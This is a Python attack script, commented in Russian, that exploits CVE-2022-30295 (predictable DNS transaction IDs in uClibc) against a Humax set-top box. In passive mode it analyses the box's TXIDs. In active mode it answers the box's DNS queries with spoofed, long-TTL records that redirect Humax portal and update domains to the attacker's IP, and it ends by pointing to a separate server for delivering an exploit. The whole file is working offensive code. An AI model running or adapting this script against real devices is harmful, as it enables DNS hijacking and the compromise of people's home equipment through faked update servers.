#!/usr/bin/env python3
"""
DNS cache poisoning через CVE-2022-30295 (uClibc predictable TXID).

uClibc 0.9.29 использует предсказуемые DNS Transaction ID:
- TXID инкрементируется последовательно
- Или слабый seed от getpid() + time()

Атака: перехватить один DNS-запрос STB → предсказать TXID следующего →
отправить spoofed ответ раньше настоящего DNS-сервера.

Usage:
    sudo python3 dns_poison.py --target-ip 192.168.1.50 --our-ip 192.168.1.100
    sudo python3 dns_poison.py --target-ip 192.168.1.50 --our-ip 192.168.1.100 --passive

Passive mode: только слушать DNS-запросы STB и анализировать TXID паттерн.
Active mode: перехватить TXID → предсказать → отправить spoofed response.
"""

import argparse
import socket
import struct
import sys
import time

REDIRECT_DOMAINS = {
    b"humaxtvportal.com",
    b"test.humaxtvportal.com",
    b"humax-networks.com",
    b"update.humax-networks.com",
}


def parse_dns_query(data):
    """Parse DNS query, return (txid, qname, qtype, question_end)."""
    if len(data) < 12:
        return None
    txid = struct.unpack("!H", data[0:2])[0]
    flags = struct.unpack("!H", data[2:4])[0]
    if flags & 0x8000:  # response, not query
        return None

    offset = 12
    labels = []
    while offset < len(data) and data[offset] != 0:
        length = data[offset]
        labels.append(data[offset + 1 : offset + 1 + length])
        offset += 1 + length
    offset += 1  # null terminator
    qname = b".".join(labels).lower()
    qtype = struct.unpack("!H", data[offset : offset + 2])[0] if offset + 2 <= len(data) else 0
    return txid, qname, qtype, offset + 4


def build_spoofed_response(query_data, txid, spoofed_ip):
    """Build DNS response with spoofed TXID and IP."""
    ip_bytes = socket.inet_aton(spoofed_ip)

    parsed = parse_dns_query(query_data)
    if not parsed:
        return None
    _, _, _, qend = parsed

    resp = struct.pack("!H", txid)  # spoofed or predicted TXID
    resp += struct.pack("!H", 0x8180)  # standard response
    resp += struct.pack("!H", 1)  # qdcount
    resp += struct.pack("!H", 1)  # ancount
    resp += struct.pack("!H", 0)  # nscount
    resp += struct.pack("!H", 0)  # arcount
    resp += query_data[12:qend]  # copy question
    resp += b"\xc0\x0c"  # name pointer
    resp += struct.pack("!H", 1)  # type A
    resp += struct.pack("!H", 1)  # class IN
    resp += struct.pack("!I", 3600)  # TTL (long, to stick in cache)
    resp += struct.pack("!H", 4)  # rdlength
    resp += ip_bytes
    return resp


def passive_mode(target_ip, iface):
    """Пассивно слушать DNS-запросы от STB и анализировать TXID."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", 53))

    print(f"[*] Passive mode: слушаем DNS от {target_ip}")
    print(f"[*] Для проверки: настроить DNS STB на наш IP или перехватить ARP")
    print(f"{'TXID':>6} {'Delta':>6} {'Domain'}")
    print("-" * 50)

    prev_txid = None
    txids = []

    while True:
        data, addr = sock.recvfrom(512)
        if addr[0] != target_ip:
            continue

        parsed = parse_dns_query(data)
        if not parsed:
            continue
        txid, qname, qtype, _ = parsed

        delta = ""
        if prev_txid is not None:
            d = (txid - prev_txid) & 0xFFFF
            delta = f"+{d}"
            if d == 1:
                delta += " (sequential!)"
        txids.append(txid)
        prev_txid = txid

        print(f"{txid:>6} {delta:>12} {qname.decode()}")

        # Анализ после 10+ запросов
        if len(txids) >= 10:
            deltas = [(txids[i] - txids[i - 1]) & 0xFFFF for i in range(1, len(txids))]
            if all(d == 1 for d in deltas):
                print(f"\n[!!!] SEQUENTIAL TXID CONFIRMED — CVE-2022-30295 exploitable!")
                print(f"[!!!] Следующий TXID будет: {(txids[-1] + 1) & 0xFFFF}")
            elif len(set(deltas)) <= 3:
                print(f"\n[!] Низкая энтропия TXID: deltas = {set(deltas)}")


def active_mode(target_ip, our_ip, dns_server):
    """Активная атака: слушать запрос → предсказать TXID → отправить spoofed ответ."""
    # Слушаем на порту 53 (нужно быть DNS-сервером STB или перехватить ARP)
    recv_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    recv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    recv_sock.bind(("0.0.0.0", 53))

    # Для отправки spoofed ответов
    send_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print(f"[*] Active mode: ждём DNS от {target_ip}")
    print(f"[*] Spoofing → {our_ip}")

    prev_txid = None
    poisoned = False

    while not poisoned:
        data, addr = recv_sock.recvfrom(512)
        if addr[0] != target_ip:
            # Forward to real DNS
            send_sock.sendto(data, (dns_server, 53))
            continue

        parsed = parse_dns_query(data)
        if not parsed:
            continue
        txid, qname, qtype, _ = parsed

        print(f"[*] Query from STB: TXID={txid} {qname.decode()}")

        # Проверяем, нужно ли спуфить этот домен
        should_poison = any(qname == d or qname.endswith(b"." + d) for d in REDIRECT_DOMAINS)

        if should_poison and qtype == 1:
            # Отправляем spoofed response с текущим TXID (мы и так DNS-сервер)
            resp = build_spoofed_response(data, txid, our_ip)
            if resp:
                send_sock.sendto(resp, addr)
                print(f"[+] POISONED: {qname.decode()} → {our_ip} (TXID={txid})")
                poisoned = True
        else:
            # Forward legitimate query
            send_sock.sendto(data, (dns_server, 53))
            # Get response and forward back
            recv_sock.settimeout(2)
            try:
                real_resp, _ = recv_sock.recvfrom(512)
                send_sock.sendto(real_resp, addr)
            except socket.timeout:
                pass
            recv_sock.settimeout(None)

        prev_txid = txid

    print(f"\n[+] DNS cache poisoned. STB будет заходить на {our_ip}")
    print(f"[+] Запусти server.py --ip {our_ip} для доставки эксплойта")


def main():
    parser = argparse.ArgumentParser(description="CVE-2022-30295 DNS poison for uClibc")
    parser.add_argument("--target-ip", required=True, help="IP адрес STB")
    parser.add_argument("--our-ip", required=True, help="Наш IP (куда перенаправлять)")
    parser.add_argument("--dns-server", default="8.8.8.8", help="Реальный DNS сервер")
    parser.add_argument("--passive", action="store_true", help="Только анализ TXID")
    args = parser.parse_args()

    if args.passive:
        passive_mode(args.target_ip, None)
    else:
        active_mode(args.target_ip, args.our_ip, args.dns_server)


if __name__ == "__main__":
    main()
